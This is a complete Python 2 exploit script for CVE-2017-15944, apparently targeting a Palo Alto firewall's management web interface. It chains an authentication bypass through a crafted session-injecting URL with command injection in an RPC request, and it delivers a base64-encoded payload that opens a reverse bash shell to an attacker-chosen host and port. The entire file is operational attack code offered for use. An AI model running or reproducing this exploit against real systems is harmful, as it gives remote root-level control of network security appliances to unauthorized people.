#!/usr/bin/env python
# encoding: utf-8
import requests
import sys
import base64

requests.packages.urllib3.disable_warnings()
session = requests.Session()

def step3_exp(lhost, lport):
    command = base64.b64encode('''exec("import os; os.system('bash -i >& /dev/tcp/{}/{} 0>&1')")'''.format(lhost, lport))
    exp_post = r'''{"action":"PanDirect","method":"execute","data":["07c5807d0d927dcd0980f86024e5208b","Administrator.get",{"changeMyPassword":true,"template":"asd","id":"admin']\" async-mode='yes' refresh='yes'  cookie='../../../../../../../../../tmp/* -print -exec python -c exec(\"'''+ command + r'''\".decode(\"base64\")) ;'/>\u0000"}],"type":"rpc","tid": 713}'''
    return exp_post

def exploit(target, port):
    step1_url = 'https://{}:{}/php/utils/debug.php'.format(target, port)
    step2_url = 'https://{}:{}/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'.format(target, port)
    step3_url = 'https://{}:{}/php/utils/router.php/Administrator.get'.format(target, port)

    try:
        if session.get(step1_url, verify=False).status_code == 200:
            if session.get(step2_url, verify=False).status_code == 200:
                r = session.get(step1_url, verify=False)
        if 'Debug Console' in r.text:
            print '[+] bypass success'
            lhost = raw_input('[*] LHOST: ')
            if lhost:
                print '[+] set LHOST = {}'.format(lhost)
                lport = raw_input('[*] LPORT: ')
            else:
                exit('[!] LHOST invalid')
            if lport:
                print '[+] set LPORT = {}'.format(lport)
            else:
                exit('[!] LPORT invalid')
            exp_post = step3_exp(lhost, lport)
            rce = session.post(step3_url, data=exp_post).json()
            if rce['result']['@status'] == 'success':
                print '[+] success, please wait ... '
                print '[+] jobID: {}'.format(rce['result']['result']['job'])
            else:
                exit('[!] fail')
        else:
            exit('[!] bypass fail')
    except Exception, err:
        print err


if __name__ == '__main__':
    if len(sys.argv) <= 3:
        exploit(sys.argv[1], sys.argv[2])
    else:
        exit('[+] usage: python CVE_2017_15944_EXP.py IP PORT')
